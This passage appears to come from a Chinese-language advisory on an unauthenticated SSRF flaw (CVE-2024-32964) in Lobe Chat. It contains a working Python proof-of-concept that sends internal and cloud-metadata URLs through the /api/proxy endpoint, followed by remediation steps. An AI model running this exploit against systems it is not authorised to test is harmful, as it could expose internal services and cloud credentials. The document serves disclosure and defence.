    - 利用漏洞泄露敏感信息或进行内网横向移动
    - 由于无需认证即可利用，攻击门槛较低

import requests
import json

def test_lobe_chat_ssrf(target_url):
    """
    测试Lobe Chat SSRF漏洞 (CVE-2024-32964)
    
    Args:
        target_url: Lobe Chat实例的基础URL，如 http://example.com
    """
    
    # 测试端点
    proxy_endpoint = f"{target_url.rstrip('/')}/api/proxy"
    
    # 常见的内部目标
    internal_targets = [
        "http://127.0.0.1:8080",
        "http://localhost:3000",
        "http://169.254.169.254/latest/meta-data/",
        "http://192.168.1.1",
        "http://10.0.0.1"
    ]
    
    print(f"[*] 测试目标: {target_url}")
    print(f"[*] 代理端点: {proxy_endpoint}")
    print("[*] 开始SSRF测试...\n")
    
    for target in internal_targets:
        try:
            payload = {
                "url": target,
                "method": "GET"
            }
            
            print(f"[+] 测试: {target}")
            response = requests.post(
                proxy_endpoint,
                json=payload,
                timeout=10,
                verify=False
            )
            
            print(f"   状态码: {response.status_code}")
            print(f"   响应长度: {len(response.text)}")
            
            if response.status_code < 500:
                print(f"   [!] 可能成功访问内部资源!")
                if len(response.text) > 0:
                    print(f"   响应预览: {response.text[:200]}...")
            print()
            
        except requests.exceptions.Timeout:
            print(f"   [-] 请求超时 (可能被拦截或服务不可达)")
            print()
        except requests.exceptions.ConnectionError:
            print(f"   [-] 连接错误")
            print()
        except Exception as e:
            print(f"   [-] 错误: {str(e)}")
            print()

if __name__ == "__main__":
    # 使用示例
    target = "http://vulnerable-lobe-chat.example.com"
    test_lobe_chat_ssrf(target)

## 修复建议
1. 升级到Lobe Chat 0.150.6或更高版本
2. 对/api/proxy端点实施严格的访问控制和输入验证
3. 限制代理功能只能访问特定的、可信的外部域名
4. 实施白名单机制，只允许访问预授权的URL
5. 添加请求认证，确保只有授权用户可以使用代理功能
6. 监控异常的代理请求模式
